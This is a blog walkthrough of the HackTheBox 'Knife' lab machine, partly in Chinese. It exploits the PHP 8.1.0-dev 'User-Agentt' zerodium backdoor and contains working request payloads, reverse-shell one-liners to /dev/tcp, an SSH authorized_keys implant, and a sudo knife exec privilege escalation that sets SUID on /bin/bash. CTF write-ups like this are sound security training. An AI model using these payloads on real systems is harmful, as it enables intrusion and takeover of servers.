---
title: Lab - HTB - Esay - Knife
date: 2021-03-29 11:11:11 -0400
description: HackTheBox
categories: [Lab, HackTheBox]
# img: /assets/img/sample/rabbit.png
tags: [Lab, HackTheBox]
---

- [Knife](#knife)
	- [Initial](#initial)
		- [Recon: Nmap\&nikto](#recon-nmapnikto)
		- [Recon: Brup](#recon-brup)
		- [CVE](#cve)
			- [漏洞概述](#漏洞概述)
			- [漏洞复现](#漏洞复现)
	- [Gain access to shell: Brup](#gain-access-to-shell-brup)
		- [user.txt: Brupsuite](#usertxt-brupsuite)
		- [user.txt: ReverseShell](#usertxt-reverseshell)
	- [Privilege escalation](#privilege-escalation)
		- [Root.txt: Execute ruby scripts](#roottxt-execute-ruby-scripts)
		- [Root.txt: ssh](#roottxt-ssh)

---

# Knife

![pic](https://miro.medium.com/max/2386/1*r6VB8UjhRBjRQYECPhXyCQ.png)

---

## Initial

### Recon: Nmap&nikto

```
nmap -A 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 01:01 CDT
Nmap scan report for 10.10.10.242
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|**  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```

Open port 22 and 80

Port 80: a simple web page.

![web](https://miro.medium.com/max/3856/1*EJ4TJ-U64ohnB-HxBn9HUw.png)


```bash
# confirm again
nikto -host 10.10.10.242
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    10.10.10.242
+ Target Port:        80
+ Start Time:         2021-05-29 14:07:49 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```


### Recon: Brup

1. Request

```
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

2. Response

```
HTTP/1.1 200 OK
Date: Sat, 29 May 2021 06:18:41 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8
```

![pic](https://miro.medium.com/max/1916/1*QzcG57XfIxQyBzs78faxZA.png)


php version: **“PHP/8.1.0-dev”.**
- [article](https://blog.csdn.net/qq_44159028/article/details/116992989).


---


### CVE

#### 漏洞概述

PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。

PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。

目前
- PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。
- 由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行。

**漏洞影响**
- `PHP 8.1.0-dev`


#### 漏洞复现

1. 环境搭建
   - 利用vulhub搭建环境，进入`/vulhub-master/php/8.1-backdoor`中，执行`docker-compose up -d`启动环境，访问`8080`

2. 文件读取
   - 后门为添加请求头
   - `User-Agentt: zerodiumsystem('id');`

3. reverse shell
   - `nc -nvlp 4444`
   - `bash -c 'exec bash -i &>/dev/tcp/10.10.10.242/4444 <&1'`


---

## Gain access to shell: Brup

1. 使用burp抓包，并加入字段, 发现被成功执行

```bash
# send the request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumvar_dump(2*3);
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

# get the response
HTTP/1.1 200 OK
Date: Sat, 29 May 2021 19:14:58 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5822
Connection: close
Content-Type: text/html; charset=UTF-8
# int(6)
<!DOCTYPE html>
```

![Screen Shot 2021-05-29 at 2.16.20 PM](https://i.imgur.com/xz3NtvI.png)



2. try commands


```bash
GET /css?family=Raleway:200,100,700,4004 HTTP/1.1
Host: fonts.googleapis.com
Connection: close
sec-ch-ua: ";Naot A Brand";v="99","chromium";v="88"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/css, */*;q=0.1
Sec-Fech-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: style
Referer: https://10.10.10.242/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

![1_c7cyx33cEdLaP17VZ1VaWg](https://i.imgur.com/mH5i1jV.png)

```bash
# request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumsystem("id");
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

# response
HTTP/1.1 200 OK
Date: Sat, 29 May 2021 19:16:14 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5866
Connection: close
Content-Type: text/html; charset=UTF-8
# uid=1000(james) gid=1000(james) groups=1000(james)
```

![Screen Shot 2021-05-29 at 2.15.37 PM](https://i.imgur.com/1MHe7qp.png)


### user.txt: Brupsuite

Run command under **“user-agentt”**

```bash
# request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumsystem("cd ; cat user.txt");
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

# bf504d51c63921ad9bf94f71d9a41c**
```

![Screen Shot 2021-05-29 at 16.55.02](https://i.imgur.com/KbWDX7k.png)


### user.txt: ReverseShell

push a **bash shell** under **“user-agentt”**

```bash
# setup the reverse shell
ncat -lvnp 1111
nc -lvnp 1111
```

```bash
# request
GET / HTTP/1.1
Host: 10.10.10.242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
# User-Agentt: zerodiumsystem("/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.240/9001 0>&1'");
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

![1_4FV2zoyjjVJNAv5VSWKxgw](https://i.imgur.com/0QA3NpT.png)

![pic](https://miro.medium.com/max/1600/1*op1CfSSKMQTGcz1nu6sF2g.png)


---

## Privilege escalation

make this shell a stable one

```bash
which python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

check how many sudo commands can the user james run:


```bash
$ sudo -l
# So poor, james can only run the command /usr/bin/knife as super user without password
```

### Root.txt: Execute ruby scripts

Create a ruby script and execute it via knife from the command `knife exec [SCRIPT] (options)`

1. Create a file and save it with `.rb` extension

```bash
# root.rb
f = File.open(“/root/root.txt”, “r”)
f.each_line do |line|
puts line
end
f.close
```

2. Send it to victim machine

```bash


python -m SimpleHTTPServer 80
```

3. vicitim machine:

```bash
# get the file
$ wget 10.0.0.20:80/root.rb

# execute the script
sudo /usr/bin/knife exec root.rb
```


### Root.txt: ssh

add **ssh** public key inside **james** **.ssh** folder.

```bash
$ mkdir HTBK
$ cd HTBK/

$ ssh-keygen
	Generating public/private rsa key pair.
	Enter file in which to save the key (/Users/luo/.ssh/id_rsa): id_rsa
	Enter passphrase (empty for no passphrase):
	Enter same passphrase again:
	Your identification has been saved in id_rsa.
	Your public key has been saved in id_rsa.pub.
	The key fingerprint is:
	SHA256:7aSgrJeWq1J7ifoRQsawEFgdNpiVDvY6iJe4COEcY1A luo@J.local
	The keys randomart image is:
	+---[RSA 3072]----+
	|=+E==o           |
	|*.=.o.           |
	|o= +             |
	|++  o    .       |
	|*++o  . S o      |
	|=+*o . . +       |
	|o+.+o+  . .      |
	|+ ooB            |
	|.++=..           |
	+----[SHA256]-----+

$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvYqBYewmRysNFSR5ZE3mFZmOX5DjBBrNR2Y20H5NEgIyxgvjSPmINgw7alVnMqQTNUQvQULr0TZMH5Nh1hNswext4LqC5dHQizUhEJxXC6ncJLtux/hh2nzveMnraDiClU3LFhEP/TnC/SZrYor/R/G4gm6XhHsFrO2t0b1CVbo+jEgM7YUnpDknh6rAjI5L2RFIRsEHwwVC9kxGVlim0BV0NRc3sfwDKqE8AC1aK/L79RNCIeVKzRVVdi7xwI26kHVRGRa1o3gzz3SR+23oQWfjNo7hmV+KFz44xVEDi2HdGnpCaCmNirTRFPVw83/UFhDI9r2zzhUjM6+XwDRkBdlKkXU0UVGCoBjyTCvuhLHzb7qe7c+YTd0W24k95gaNUZjuFngB11v2D9fBd5uZXh1VxgrCrKx4zv27fiUpYqfEapMUF0sRgJdTUymOyB/nKablzDWlaOoqzqsyjrAZUFbB4ZpiWcAy0+sARjCjM8l5aCS6cICqs1ehdjWmCdo0= luo@J.local
```

![pic](https://miro.medium.com/max/1370/1*PkryjetVL9q2jJYMUdFuew.png)

![pic](https://miro.medium.com/max/3832/1*kIJl3Cq_L1POqnQM9KR2LA.png)


upload **id\_rsa.pub** key inside **authorized\_keys** on the machine.

```bash
# User-Agentt: zerodiumsystem("cd ; cat user.txt");
cd .ssh ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvYqBYewmRysNFSR5ZE3mFZmOX5DjBBrNR2Y20H5NEgIyxgvjSPmINgw7alVnMqQTNUQvQULr0TZMH5Nh1hNswext4LqC5dHQizUhEJxXC6ncJLtux/hh2nzveMnraDiClU3LFhEP/TnC/SZrYor/R/G4gm6XhHsFrO2t0b1CVbo+jEgM7YUnpDknh6rAjI5L2RFIRsEHwwVC9kxGVlim0BV0NRc3sfwDKqE8AC1aK/L79RNCIeVKzRVVdi7xwI26kHVRGRa1o3gzz3SR+23oQWfjNo7hmV+KFz44xVEDi2HdGnpCaCmNirTRFPVw83/UFhDI9r2zzhUjM6+XwDRkBdlKkXU0UVGCoBjyTCvuhLHzb7qe7c+YTd0W24k95gaNUZjuFngB11v2D9fBd5uZXh1VxgrCrKx4zv27fiUpYqfEapMUF0sRgJdTUymOyB/nKablzDWlaOoqzqsyjrAZUFbB4ZpiWcAy0+sARjCjM8l5aCS6cICqs1ehdjWmCdo0= luo@J.local" > authorized_keys
```

![pic](https://miro.medium.com/max/3796/1*Xtuq_q51vCuWhFakER38kQ.png)

login through **id\_rsa key**

![pic](https://miro.medium.com/max/1890/1*7R4tGiXW-I7Mb5N7VyM79g.png)

Privilege-Escalation:
- check the user right
- In the ruby file: give permission to **/bin/bash** for suid bit set so james user can easily execute the root commands and get **root.txt**

![pic](https://miro.medium.com/max/2592/1*1PXYu5d7UBgDBCm8iMZTDQ.png)

![pic](https://miro.medium.com/max/1376/1*GmBKl2x_ryr94rEfpf5r6Q.png)


```bash
# check the user right
$ sudo -l

# create ruby file
echo "system('chmod +s /bin/bash')" > priv.rb
sudo /usr/bin/knife exec priv.rb
/bin/bash -p
cd /root
cat root.txt
```


Thanks for reading this far. We will meet in my next article.

**Happy Hacking** ☺






.
